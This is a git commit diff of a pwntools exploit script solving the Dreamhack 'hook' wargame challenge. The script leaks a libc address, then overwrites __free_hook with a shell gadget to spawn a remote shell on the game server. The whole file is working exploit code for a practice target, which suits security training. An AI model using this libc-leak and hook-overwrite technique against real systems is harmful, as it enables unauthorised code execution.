09b5f0fb02f4bd336a68ae52906088206097b7b7
Brian Lee <hibrian827@gmail.com>
2025-01-19 21:22:54 +0900

    minor changes

--- Dreamhack/Pwnable/hook/answer.py
+++ Dreamhack/Pwnable/hook/answer.py
@@ -1,8 +1,8 @@
 from pwn import *
 
-port = 15931
-rem = remote("host3.dreamhack.games", port)
-lib = ELF("./hook/problem/libc-2.23.so")
+port = 17664
+rem = remote("host1.dreamhack.games", port)
+lib = ELF("./Pwnable/hook/problem/libc-2.23.so")
 
 def slog(name, addr): return success(': '.join([name, hex(addr)]))
 
@@ -10,12 +10,12 @@ rem.recvuntil(b'stdout: 0x')
 stdout_addr = int(rem.recvn(12).decode(), 16)
 lib_base = stdout_addr - lib.symbols['_IO_2_1_stdout_']
 hook_addr = lib_base + lib.symbols['__free_hook']
-sys_addr = lib_base + lib.symbols['system']
+shell_addr = 0x400a11
 
 slog('lib', lib_base)
 slog('hook', hook_addr)
 
-payload = p64(hook_addr) + p64(sys_addr)
+payload = p64(hook_addr) + p64(shell_addr)
 
 rem.sendlineafter(b'Size: ', b'20')
 rem.sendlineafter(b'Data: ', payload)
